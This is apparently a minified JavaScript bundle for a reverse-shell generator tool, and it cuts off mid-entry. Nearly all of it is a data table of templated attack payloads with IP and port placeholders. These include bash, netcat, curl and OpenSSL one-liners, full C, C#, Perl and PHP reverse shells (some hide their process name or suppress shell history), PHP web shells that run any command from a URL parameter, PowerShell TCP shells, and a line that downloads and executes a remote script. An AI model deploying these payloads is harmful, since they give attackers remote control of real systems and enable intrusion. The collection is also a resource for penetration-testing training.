import{r as a,j as t,Z as V,bv as q,w as K,o as Y,X,D as J,C as I,e as F,T as Z}from"./vendor-framework-iPceRV18.js";import{u as Q,p as i,s as H}from"./index-Dbh2sK8X.js";import"./vendor-mermaid-Dy2GZa3Y.js";import"./catalog-data-t7iLJPBy.js";import"./vendor-utils-oQXWb4Lk.js";import"./vendor-ui-6yqNNmuq.js";import"./tracks-data-Cj7R5y0s.js";import"./vendor-jszip-BTQvSLGL.js";import"./methodology-data-CbduTmc6.js";const f=[{id:"rev-bash-i",name:"Bash -i",category:"Reverse",language:"Bash",platform:"Linux",command:"{shell} -i >& /dev/tcp/{ip}/{port} 0>&1",listener:"nc -lvnp {port}",notes:"",extension:".sh",isFullScript:!1},{id:"rev-bash-196",name:"Bash 196",category:"Reverse",language:"Bash",platform:"Linux",command:"0<&196;exec 196<>/dev/tcp/{ip}/{port}; {shell} <&196 >&196 2>&196",listener:"nc -lvnp {port}",notes:"",extension:".sh",isFullScript:!1},{id:"rev-bash-read-line",name:"Bash read line",category:"Reverse",language:"Bash",platform:"Linux",command:"exec 5<>/dev/tcp/{ip}/{port};cat <&5 | while read line; do $line 2>&5 >&5; done",listener:"nc -lvnp {port}",notes:"",extension:".sh",isFullScript:!1},{id:"rev-bash-5",name:"Bash 5",category:"Reverse",language:"Bash",platform:"Linux",command:"{shell} -i 5<> /dev/tcp/{ip}/{port} 0<&5 1>&5 2>&5",listener:"nc -lvnp {port}",notes:"",extension:".sh",isFullScript:!1},{id:"rev-bash-udp",name:"Bash udp",category:"Reverse",language:"Bash",platform:"Linux",command:"{shell} -i >& /dev/udp/{ip}/{port} 0>&1",listener:"nc -u -lvnp {port}",notes:"",extension:".sh",isFullScript:!1},{id:"rev-nc-mkfifo",name:"nc mkfifo",category:"Reverse",language:"Netcat",platform:"Linux",command:"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|{shell} -i 2>&1|nc {ip} {port} >/tmp/f",listener:"nc -lvnp {port}",notes:"",extension:".txt",isFullScript:!1},{id:"rev-nc-e",name:"nc -e",category:"Reverse",language:"Netcat",platform:"Linux",command:"nc {ip} {port} -e {shell}",listener:"nc -lvnp {port}",notes:"",extension:".txt",isFullScript:!1},{id:"rev-nc-exe-e",name:"nc.exe -e",category:"Reverse",language:"Netcat",platform:"Windows",command:"nc.exe {ip} {port} -e {shell}",listener:"nc -lvnp {port}",notes:"",extension:".txt",isFullScript:!1},{id:"rev-busybox-nc-e",name:"BusyBox nc -e",category:"Reverse",language:"Netcat",platform:"Linux",command:"busybox nc {ip} {port} -e {shell}",listener:"nc -lvnp {port}",notes:"",extension:".txt",isFullScript:!1},{id:"rev-nc-c",name:"nc -c",category:"Reverse",language:"Netcat",platform:"Linux",command:"nc -c {shell} {ip} {port}",listener:"nc -lvnp {port}",notes:"",extension:".txt",isFullScript:!1},{id:"rev-ncat-e",name:"ncat -e",category:"Reverse",language:"Netcat",platform:"Linux",command:"ncat {ip} {port} -e {shell}",listener:"nc -lvnp {port}",notes:"",extension:".txt",isFullScript:!1},{id:"rev-ncat-exe-e",name:"ncat.exe -e",category:"Reverse",language:"Netcat",platform:"Windows",command:"ncat.exe {ip} {port} -e {shell}",listener:"nc -lvnp {port}",notes:"",extension:".txt",isFullScript:!1},{id:"rev-ncat-udp",name:"ncat udp",category:"Reverse",language:"Netcat",platform:"Linux",command:"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|{shell} -i 2>&1|ncat -u {ip} {port} >/tmp/f",listener:"nc -u -lvnp {port}",notes:"",extension:".txt",isFullScript:!1},{id:"rev-curl",name:"curl",category:"Reverse",language:"cURL / Telnet",platform:"Linux",command:"C='curl -Ns telnet://{ip}:{port}'; $C </dev/null 2>&1 | {shell} 2>&1 | $C >/dev/null",listener:"nc -lvnp {port}",notes:"",extension:".txt",isFullScript:!1},{id:"rev-rustcat",name:"rustcat",category:"Reverse",language:"Rustcat",platform:"Linux",command:"rcat connect -s {shell} {ip} {port}",listener:"rcat -lp {port}",notes:"",extension:".txt",isFullScript:!1},{id:"rev-c",name:"C",category:"Reverse",language:"C / C#",platform:"Linux",command:`#include <stdio.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>

int main(void){
    int port = {port};
    struct sockaddr_in revsockaddr;

    int sockt = socket(AF_INET, SOCK_STREAM, 0);
    revsockaddr.sin_family = AF_INET;       
    revsockaddr.sin_port = htons(port);
    revsockaddr.sin_addr.s_addr = inet_addr("{ip}");

    connect(sockt, (struct sockaddr *) &revsockaddr, 
    sizeof(revsockaddr));
    dup2(sockt, 0);
    dup2(sockt, 1);
    dup2(sockt, 2);

    char * var argv[] = {"{shell}", NULL};
    execvp("{shell}", argv);

    return 0;       
}`,listener:"nc -lvnp {port}",notes:"",extension:".c",isFullScript:!0},{id:"rev-c-windows",name:"C Windows",category:"Reverse",language:"C / C#",platform:"Windows",command:`#include <winsock2.h>\r
#include <stdio.h>\r
#pragma comment(lib,"ws2_32")\r
\r
WSADATA wsaData;\r
SOCKET Winsock;\r
struct sockaddr_in hax; \r
char ip_addr[16] = "{ip}"; \r
char port[6] = "{port}";            \r
\r
STARTUPINFO ini_processo;\r
\r
PROCESS_INFORMATION processo_info;\r
\r
int main()\r
{\r
    WSAStartup(MAKEWORD(2, 2), &wsaData);\r
    Winsock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);\r
\r
\r
    struct hostent *host; \r
    host = gethostbyname(ip_addr);\r
    strcpy_s(ip_addr, 16, inet_ntoa(*((struct in_addr *)host->h_addr)));\r
\r
    hax.sin_family = AF_INET;\r
    hax.sin_port = htons(atoi(port));\r
    hax.sin_addr.s_addr = inet_addr(ip_addr);\r
\r
    WSAConnect(Winsock, (SOCKADDR*)&hax, sizeof(hax), NULL, NULL, NULL, NULL);\r
\r
    memset(&ini_processo, 0, sizeof(ini_processo));\r
    ini_processo.cb = sizeof(ini_processo);\r
    ini_processo.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW; \r
    ini_processo.hStdInput = ini_processo.hStdOutput = ini_processo.hStdError = (HANDLE)Winsock;\r
\r
    TCHAR cmd[255] = TEXT("cmd.exe");\r
\r
    CreateProcess(NULL, cmd, NULL, NULL, TRUE, 0, NULL, NULL, &ini_processo, &processo_info);\r
\r
    return 0;\r
}`,listener:"nc -lvnp {port}",notes:"",extension:".c",isFullScript:!0},{id:"rev-c-tcp-client",name:"C# TCP Client",category:"Reverse",language:"C / C#",platform:"Both",command:`using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
	public class Program
	{
		static StreamWriter streamWriter;

		public static void Main(string[] args)
		{
			using(TcpClient client = new TcpClient("{ip}", {port}))
			{
				using(Stream stream = client.GetStream())
				{
					using(StreamReader rdr = new StreamReader(stream))
					{
						streamWriter = new StreamWriter(stream);
						
						StringBuilder strInput = new StringBuilder();

						Process p = new Process();
						p.StartInfo.FileName = "{shell}";
						p.StartInfo.CreateNoWindow = true;
						p.StartInfo.UseShellExecute = false;
						p.StartInfo.RedirectStandardOutput = true;
						p.StartInfo.RedirectStandardInput = true;
						p.StartInfo.RedirectStandardError = true;
						p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
						p.Start();
						p.BeginOutputReadLine();

						while(true)
						{
							strInput.Append(rdr.ReadLine());
							//strInput.Append("\\n");
							p.StandardInput.WriteLine(strInput);
							strInput.Remove(0, strInput.Length);
						}
					}
				}
			}
		}

		private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
        {
            StringBuilder strOutput = new StringBuilder();

            if (!String.IsNullOrEmpty(outLine.Data))
            {
                try
                {
                    strOutput.Append(outLine.Data);
                    streamWriter.WriteLine(strOutput);
                    streamWriter.Flush();
                }
                catch (Exception err) { }
            }
        }

	}
}`,listener:"nc -lvnp {port}",notes:"",extension:".cs",isFullScript:!0},{id:"rev-c-bash-i",name:"C# Bash -i",category:"Reverse",language:"Bash",platform:"Both",command:`using System;
using System.Diagnostics;

namespace BackConnect {
  class ReverseBash {
	public static void Main(string[] args) {
	  Process proc = new System.Diagnostics.Process();
	  proc.StartInfo.FileName = "{shell}";
	  proc.StartInfo.Arguments = "-c \\"{shell} -i >& /dev/tcp/{ip}/{port} 0>&1\\"";
	  proc.StartInfo.UseShellExecute = false;
	  proc.StartInfo.RedirectStandardOutput = true;
	  proc.Start();

	  while (!proc.StandardOutput.EndOfStream) {
		Console.WriteLine(proc.StandardOutput.ReadLine());
	  }
	}
  }
}
`,listener:"nc -lvnp {port}",notes:"",extension:".sh",isFullScript:!0},{id:"rev-haskell-1",name:"Haskell #1",category:"Reverse",language:"Haskell",platform:"Linux",command:`module Main where

import System.Process

main = callCommand "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | {shell} -i 2>&1 | nc {ip} {port} >/tmp/f"`,listener:"nc -lvnp {port}",notes:"",extension:".txt",isFullScript:!1},{id:"rev-openssl",name:"OpenSSL",category:"Reverse",language:"OpenSSL",platform:"Linux",command:"mkfifo /tmp/s; {shell} -i < /tmp/s 2>&1 | openssl s_client -quiet -connect {ip}:{port} > /tmp/s; rm /tmp/s",listener:"openssl s_server -quiet -key key.pem -cert cert.pem -port {port}",notes:"",extension:".txt",isFullScript:!1},{id:"rev-perl",name:"Perl",category:"Reverse",language:"Perl",platform:"Linux",command:`perl -e 'use Socket;$i="{ip}";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("{shell} -i");};'`,listener:"nc -lvnp {port}",notes:"",extension:".pl",isFullScript:!1},{id:"rev-perl-no-sh",name:"Perl no sh",category:"Reverse",language:"Perl",platform:"Linux",command:`perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"{ip}:{port}");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'`,listener:"nc -lvnp {port}",notes:"",extension:".sh",isFullScript:!1},{id:"rev-perl-pentestmonkey",name:"Perl PentestMonkey",category:"Reverse",language:"Perl",platform:"Linux",command:`#!/usr/bin/perl -w
# perl-reverse-shell - A Reverse Shell implementation in PERL
# Copyright (C) 2006 pentestmonkey@pentestmonkey.net
#
# This tool may be used for legal purposes only.  Users take full responsibility
# for any actions performed using this tool.  The author accepts no liability
# for damage caused by this tool.  If these terms are not acceptable to you, then
# do not use this tool.
#
# In all other respects the GPL version 2 applies:
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2 as
# published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License along
# with this program; if not, write to the Free Software Foundation, Inc.,
# 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.
#
# This tool may be used for legal purposes only.  Users take full responsibility
# for any actions performed using this tool.  If these terms are not acceptable to
# you, then do not use this tool.
#
# You are encouraged to send comments, improvements or suggestions to
# me at pentestmonkey@pentestmonkey.net
#
# Description
# -----------
# This script will make an outbound TCP connection to a hardcoded IP and port.
# The recipient will be given a shell running as the current user (apache normally).
#

use strict;
use Socket;
use FileHandle;
use POSIX;
my $VERSION = "1.0";

# Where to send the reverse shell.  Change these.
my $ip = '{ip}';
my $port = {port};

# Options
my $daemon = 1;
my $auth   = 0; # 0 means authentication is disabled and any 
		# source IP can access the reverse shell
my $authorised_client_pattern = qr(^127\\.0\\.0\\.1$);

# Declarations
my $global_page = "";
my $fake_process_name = "/usr/sbin/apache";

# Change the process name to be less conspicious
$0 = "[httpd]";

# Authenticate based on source IP address if required
if (defined($ENV{'REMOTE_ADDR'})) {
	cgiprint("Browser IP address appears to be: $ENV{'REMOTE_ADDR'}");

	if ($auth) {
		unless ($ENV{'REMOTE_ADDR'} =~ $authorised_client_pattern) {
			cgiprint("ERROR: Your client isn't authorised to view this page");
			cgiexit();
		}
	}
} elsif ($auth) {
	cgiprint("ERROR: Authentication is enabled, but I couldn't determine your IP address.  Denying access");
	cgiexit(0);
}

# Background and dissociate from parent process if required
if ($daemon) {
	my $pid = fork();
	if ($pid) {
		cgiexit(0); # parent exits
	}

	setsid();
	chdir('/');
	umask(0);
}

# Make TCP connection for reverse shell
socket(SOCK, PF_INET, SOCK_STREAM, getprotobyname('tcp'));
if (connect(SOCK, sockaddr_in($port,inet_aton($ip)))) {
	cgiprint("Sent reverse shell to $ip:$port");
	cgiprintpage();
} else {
	cgiprint("Couldn't open reverse shell to $ip:$port: $!");
	cgiexit();	
}

# Redirect STDIN, STDOUT and STDERR to the TCP connection
open(STDIN, ">&SOCK");
open(STDOUT,">&SOCK");
open(STDERR,">&SOCK");
$ENV{'HISTFILE'} = '/dev/null';
system("w;uname -a;id;pwd");
exec({"{shell}"} ($fake_process_name, "-i"));

# Wrapper around print
sub cgiprint {
	my $line = shift;
	$line .= "<p>\\n";
	$global_page .= $line;
}

# Wrapper around exit
sub cgiexit {
	cgiprintpage();
	exit 0; # 0 to ensure we don't give a 500 response.
}

# Form HTTP response using all the messages gathered by cgiprint so far
sub cgiprintpage {
	print "Content-Length: " . length($global_page) . "\\r
Connection: close\\r
Content-Type: text\\/html\\r\\n\\r\\n" . $global_page;
}
`,listener:"nc -lvnp {port}",notes:"Classic PentestMonkey standalone reverse shell. Widely used across HTB & OSCP for file uploads.",extension:".pl",isFullScript:!0},{id:"rev-php-pentestmonkey",name:"PHP PentestMonkey",category:"Reverse",language:"PHP",platform:"Both",command:`<?php
// php-reverse-shell - A Reverse Shell implementation in PHP. Comments stripped to slim it down. RE: https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
// Copyright (C) 2007 pentestmonkey@pentestmonkey.net

set_time_limit (0);
$VERSION = "1.0";
$ip = '{ip}';
$port = {port};
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; {shell} -i';
$daemon = 0;
$debug = 0;

if (function_exists('pcntl_fork')) {
	$pid = pcntl_fork();
	
	if ($pid == -1) {
		printit("ERROR: Can't fork");
		exit(1);
	}
	
	if ($pid) {
		exit(0);  // Parent exits
	}
	if (posix_setsid() == -1) {
		printit("Error: Can't setsid()");
		exit(1);
	}

	$daemon = 1;
} else {
	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}

chdir("/");

umask(0);

// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
	printit("$errstr ($errno)");
	exit(1);
}

$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
	printit("ERROR: Can't spawn shell");
	exit(1);
}

stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
	if (feof($sock)) {
		printit("ERROR: Shell connection terminated");
		break;
	}

	if (feof($pipes[1])) {
		printit("ERROR: Shell process terminated");
		break;
	}

	$read_a = array($sock, $pipes[1], $pipes[2]);
	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

	if (in_array($sock, $read_a)) {
		if ($debug) printit("SOCK READ");
		$input = fread($sock, $chunk_size);
		if ($debug) printit("SOCK: $input");
		fwrite($pipes[0], $input);
	}

	if (in_array($pipes[1], $read_a)) {
		if ($debug) printit("STDOUT READ");
		$input = fread($pipes[1], $chunk_size);
		if ($debug) printit("STDOUT: $input");
		fwrite($sock, $input);
	}

	if (in_array($pipes[2], $read_a)) {
		if ($debug) printit("STDERR READ");
		$input = fread($pipes[2], $chunk_size);
		if ($debug) printit("STDERR: $input");
		fwrite($sock, $input);
	}
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

function printit ($string) {
	if (!$daemon) {
		print "$string\\n";
	}
}

?>`,listener:"nc -lvnp {port}",notes:"Classic PentestMonkey standalone reverse shell. Widely used across HTB & OSCP for file uploads.",extension:".php",isFullScript:!0},{id:"rev-php-ivan-sincek",name:"PHP Ivan Sincek",category:"Reverse",language:"Netcat",platform:"Both",command:`<?php
// Copyright (c) 2020 Ivan Sincek
// v2.3
// Requires PHP v5.0.0 or greater.
// Works on Linux OS, macOS, and Windows OS.
// See the original script at https://github.com/pentestmonkey/php-reverse-shell.
class Shell {
    private $addr  = null;
    private $port  = null;
    private $os    = null;
    private $shell = null;
    private $descriptorspec = array(
        0 => array('pipe', 'r'), // shell can read from STDIN
        1 => array('pipe', 'w'), // shell can write to STDOUT
        2 => array('pipe', 'w')  // shell can write to STDERR
    );
    private $buffer  = 1024;    // read/write buffer size
    private $clen    = 0;       // command length
    private $error   = false;   // stream read/write error
    public function __construct($addr, $port) {
        $this->addr = $addr;
        $this->port = $port;
    }
    private function detect() {
        $detected = true;
        if (stripos(PHP_OS, 'LINUX') !== false) { // same for macOS
            $this->os    = 'LINUX';
            $this->shell = '{shell}';
        } else if (stripos(PHP_OS, 'WIN32') !== false || stripos(PHP_OS, 'WINNT') !== false || stripos(PHP_OS, 'WINDOWS') !== false) {
            $this->os    = 'WINDOWS';
            $this->shell = 'cmd.exe';
        } else {
            $detected = false;
            echo "SYS_ERROR: Underlying operating system is not supported, script will now exit...\\n";
        }
        return $detected;
    }
    private function daemonize() {
        $exit = false;
        if (!function_exists('pcntl_fork')) {
            echo "DAEMONIZE: pcntl_fork() does not exists, moving on...\\n";
        } else if (($pid = @pcntl_fork()) < 0) {
            echo "DAEMONIZE: Cannot fork off the parent process, moving on...\\n";
        } else if ($pid > 0) {
            $exit = true;
            echo "DAEMONIZE: Child process forked off successfully, parent process will now exit...\\n";
        } else if (posix_setsid() < 0) {
            // once daemonized you will actually no longer see the script's dump
            echo "DAEMONIZE: Forked off the parent process but cannot set a new SID, moving on as an orphan...\\n";
        } else {
            echo "DAEMONIZE: Completed successfully!\\n";
        }
        return $exit;
    }
    private function settings() {
        @error_reporting(0);
        @set_time_limit(0); // do not impose the script execution time limit
        @umask(0); // set the file/directory permissions - 666 for files and 777 for directories
    }
    private function dump($data) {
        $data = str_replace('<', '&lt;', $data);
        $data = str_replace('>', '&gt;', $data);
        echo $data;
    }
    private function read($stream, $name, $buffer) {
        if (($data = @fread($stream, $buffer)) === false) { // suppress an error when reading from a closed blocking stream
            $this->error = true;                            // set global error flag
            echo "STRM_ERROR: Cannot read from \${name}, script will now exit...\\n";
        }
        return $data;
    }
    private function write($stream, $name, $data) {
        if (($bytes = @fwrite($stream, $data)) === false) { // suppress an error when writing to a closed blocking stream
            $this->error = true;                            // set global error flag
            echo "STRM_ERROR: Cannot write to \${name}, script will now exit...\\n";
        }
        return $bytes;
    }
    // read/write method for non-blocking streams
    private function rw($input, $output, $iname, $oname) {
        while (($data = $this->read($input, $iname, $this->buffer)) && $this->write($output, $oname, $data)) {
            if ($this->os === 'WINDOWS' && $oname === 'STDIN') { $this->clen += strlen($data); } // calculate the command length
            $this->dump($data); // script's dump
        }
    }
    // read/write method for blocking streams (e.g. for STDOUT and STDERR on Windows OS)
    // we must read the exact byte length from a stream and not a single byte more
    private function brw($input, $output, $iname, $oname) {
        $fstat = fstat($input);
        $size = $fstat['size'];
        if ($this->os === 'WINDOWS' && $iname === 'STDOUT' && $this->clen) {
            // for some reason Windows OS pipes STDIN into STDOUT
            // we do not like that
            // we need to discard the data from the stream
            while ($this->clen > 0 && ($bytes = $this->clen >= $this->buffer ? $this->buffer : $this->clen) && $this->read($input, $iname, $bytes)) {
                $this->clen -= $bytes;
                $size -= $bytes;
            }
        }
        while ($size > 0 && ($bytes = $size >= $this->buffer ? $this->buffer : $size) && ($data = $this->read($input, $iname, $bytes)) && $this->write($output, $oname, $data)) {
            $size -= $bytes;
            $this->dump($data); // script's dump
        }
    }
    public function run() {
        if ($this->detect() && !$this->daemonize()) {
            $this->settings();

            // ----- SOCKET BEGIN -----
            $socket = @fsockopen($this->addr, $this->port, $errno, $errstr, 30);
            if (!$socket) {
                echo "SOC_ERROR: {$errno}: {$errstr}\\n";
            } else {
                stream_set_blocking($socket, false); // set the socket stream to non-blocking mode | returns 'true' on Windows OS

                // ----- SHELL BEGIN -----
                $process = @proc_open($this->shell, $this->descriptorspec, $pipes, null, null);
                if (!$process) {
                    echo "PROC_ERROR: Cannot start the shell\\n";
                } else {
                    foreach ($pipes as $pipe) {
                        stream_set_blocking($pipe, false); // set the shell streams to non-blocking mode | returns 'false' on Windows OS
                    }

                    // ----- WORK BEGIN -----
                    $status = proc_get_status($process);
                    @fwrite($socket, "SOCKET: Shell has connected! PID: " . $status['pid'] . "\\n");
                    do {
						$status = proc_get_status($process);
                        if (feof($socket)) { // check for end-of-file on SOCKET
                            echo "SOC_ERROR: Shell connection has been terminated\\n"; break;
                        } else if (feof($pipes[1]) || !$status['running']) {                 // check for end-of-file on STDOUT or if process is still running
                            echo "PROC_ERROR: Shell process has been terminated\\n";   break; // feof() does not work with blocking streams
                        }                                                                    // use proc_get_status() instead
                        $streams = array(
                            'read'   => array($socket, $pipes[1], $pipes[2]), // SOCKET | STDOUT | STDERR
                            'write'  => null,
                            'except' => null
                        );
                        $num_changed_streams = @stream_select($streams['read'], $streams['write'], $streams['except'], 0); // wait for stream changes | will not wait on Windows OS
                        if ($num_changed_streams === false) {
                            echo "STRM_ERROR: stream_select() failed\\n"; break;
                        } else if ($num_changed_streams > 0) {
                            if ($this->os === 'LINUX') {
                                if (in_array($socket  , $streams['read'])) { $this->rw($socket  , $pipes[0], 'SOCKET', 'STDIN' ); } // read from SOCKET and write to STDIN
                                if (in_array($pipes[2], $streams['read'])) { $this->rw($pipes[2], $socket  , 'STDERR', 'SOCKET'); } // read from STDERR and write to SOCKET
                                if (in_array($pipes[1], $streams['read'])) { $this->rw($pipes[1], $socket  , 'STDOUT', 'SOCKET'); } // read from STDOUT and write to SOCKET
                            } else if ($this->os === 'WINDOWS') {
                                // order is important
                                if (in_array($socket, $streams['read'])/*------*/) { $this->rw ($socket  , $pipes[0], 'SOCKET', 'STDIN' ); } // read from SOCKET and write to STDIN
                                if (($fstat = fstat($pipes[2])) && $fstat['size']) { $this->brw($pipes[2], $socket  , 'STDERR', 'SOCKET'); } // read from STDERR and write to SOCKET
                                if (($fstat = fstat($pipes[1])) && $fstat['size']) { $this->brw($pipes[1], $socket  , 'STDOUT', 'SOCKET'); } // read from STDOUT and write to SOCKET
                            }
                        }
                    } while (!$this->error);
                    // ------ WORK END ------

                    foreach ($pipes as $pipe) {
                        fclose($pipe);
                    }
                    proc_close($process);
                }
                // ------ SHELL END ------

                fclose($socket);
            }
            // ------ SOCKET END ------

        }
    }
}
echo '<pre>';
// change the host address and/or port number as necessary
$sh = new Shell('{ip}', {port});
$sh->run();
unset($sh);
// garbage collector requires PHP v5.3.0 or greater
// @gc_collect_cycles();
echo '</pre>';
?>`,listener:"nc -lvnp {port}",notes:"Ivan Sincek high-compatibility multi-OS (Linux/Windows/macOS) non-blocking reverse shell.",extension:".php",isFullScript:!0},{id:"rev-php-cmd",name:"PHP cmd",category:"Reverse",language:"PHP",platform:"Both",command:`<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<pre>
<?php
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd']);
    }
?>
</pre>
</body>
<script>document.getElementById("cmd").focus();<\/script>
</html>`,listener:"nc -lvnp {port}",notes:"",extension:".php",isFullScript:!0},{id:"rev-php-cmd-2",name:"PHP cmd 2",category:"Reverse",language:"PHP",platform:"Both",command:'<?php if(isset($_REQUEST["cmd"])){ echo "<pre>"; $cmd = ($_REQUEST["cmd"]); system($cmd); echo "</pre>"; die; }?>',listener:"nc -lvnp {port}",notes:"",extension:".php",isFullScript:!1},{id:"rev-php-cmd-small",name:"PHP cmd small",category:"Reverse",language:"PHP",platform:"Both",command:"<?=`$_GET[0]`?>",listener:"nc -lvnp {port}",notes:"",extension:".php",isFullScript:!1},{id:"rev-php-exec",name:"PHP exec",category:"Reverse",language:"PHP",platform:"Linux",command:`php -r '$sock=fsockopen("{ip}",{port});exec("{shell} <&3 >&3 2>&3");'`,listener:"nc -lvnp {port}",notes:"",extension:".php",isFullScript:!1},{id:"rev-php-shell-exec",name:"PHP shell_exec",category:"Reverse",language:"PHP",platform:"Linux",command:`php -r '$sock=fsockopen("{ip}",{port});shell_exec("{shell} <&3 >&3 2>&3");'`,listener:"nc -lvnp {port}",notes:"",extension:".php",isFullScript:!1},{id:"rev-php-system",name:"PHP system",category:"Reverse",language:"PHP",platform:"Both",command:`php -r '$sock=fsockopen("{ip}",{port});system("{shell} <&3 >&3 2>&3");'`,listener:"nc -lvnp {port}",notes:"",extension:".php",isFullScript:!1},{id:"rev-php-passthru",name:"PHP passthru",category:"Reverse",language:"PHP",platform:"Linux",command:`php -r '$sock=fsockopen("{ip}",{port});passthru("{shell} <&3 >&3 2>&3");'`,listener:"nc -lvnp {port}",notes:"",extension:".php",isFullScript:!1},{id:"rev-php",name:"PHP `",category:"Reverse",language:"PHP",platform:"Both",command:"php -r '$sock=fsockopen(\"{ip}\",{port});`{shell} <&3 >&3 2>&3`;'",listener:"nc -lvnp {port}",notes:"",extension:".php",isFullScript:!1},{id:"rev-php-popen",name:"PHP popen",category:"Reverse",language:"PHP",platform:"Both",command:`php -r '$sock=fsockopen("{ip}",{port});popen("{shell} <&3 >&3 2>&3", "r");'`,listener:"nc -lvnp {port}",notes:"",extension:".php",isFullScript:!1},{id:"rev-php-proc-open",name:"PHP proc_open",category:"Reverse",language:"PHP",platform:"Both",command:`php -r '$s=fsockopen("{ip}",{port});proc_open("{shell}",[$s,$s,$s],$p);'`,listener:"nc -lvnp {port}",notes:"",extension:".php",isFullScript:!1},{id:"rev-windows-conpty",name:"Windows ConPty",category:"Reverse",language:"PowerShell",platform:"Windows",command:"IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell {ip} {port}",listener:"stty raw -echo; (stty size; cat) | nc -lvnp {port}",notes:"Spawns full interactive Windows console with ConPty terminal emulation.",extension:".txt",isFullScript:!1},{id:"rev-powershell-1",name:"PowerShell #1",category:"Reverse",language:"PowerShell",platform:"Both",command:'$LHOST = "{ip}"; $LPORT = {port}; $TCPClient = New-Object Net.Sockets.TCPClient($LHOST, $LPORT); $NetworkStream = $TCPClient.GetStream(); $StreamReader = New-Object IO.StreamReader($NetworkStream); $StreamWriter = New-Object IO.StreamWriter($NetworkStream); $StreamWriter.AutoFlush = $true; $Buffer = New-Object System.Byte[] 1024; while ($TCPClient.Connected) { while ($NetworkStream.DataAvailable) { $RawData = $NetworkStream.Read($Buffer, 0, $Buffer.Length); $Code = ([text.encoding]::UTF8).GetString($Buffer, 0, $RawData -1) }; if ($TCPClient.Connected -and $Code.Length -gt 1) { $Output = try { Invoke-Expression ($Code) 2>&1 } catch { $_ }; $StreamWriter.Write("$Output`n"); $Code = $null } }; $TCPClient.Close(); $NetworkStream.Close(); $StreamReader.Close(); $StreamWriter.Close()',listener:"nc -lvnp {port}",notes:"",extension:".ps1",isFullScript:!1},{id:"rev-powershell-2",name:"PowerShell #2",category:"Reverse",language:"PowerShell",platform:"Both",command:`powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('{ip}',{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"`,listener:"nc -lvnp {port}",notes:"",extension:".ps1",isFullScript:!1},{id:"rev-powershell-3",name:"PowerShell #3",category:"Reverse",language:"PowerShell",platform:"Both",command:`powershell -nop -W hidden -noni -ep bypass -c "$TCPClient = New-Object Net.Sockets.TCPClient('{ip}', {port});$NetworkStream = $TCPClient.GetStream();$StreamWriter = New-Object IO.StreamWriter($NetworkStream);function WriteToStream ($String) {[byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {0};$StreamWriter.Write($String + 'SHELL> ');$StreamWriter.Flush()}WriteToStream '';while(($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);$Output = try {Invoke-Expression $Command 2>&1 | Out-String} catch {$_ | Out-String}WriteToStream ($Output)}$StreamWriter.Close()"`,listener:"nc -lvnp {port}",notes:"",extension:".ps1",isFullScript:!1},{id:"rev-powershell-4-tls",name:"PowerShell #4 (TLS)",category:"Reverse",language:"PowerShell",platform:"Both",command:"$sslProtocols = [System.Security.Authentication.SslProtocols]::Tls12; $TCPClient = New-Object Net.Sockets.TCPClient('{ip}', {port});$NetworkStream = $TCPClient.GetStream();$SslStream = New-Object Net.Security.SslStream($NetworkStream,$false,({$true} -as 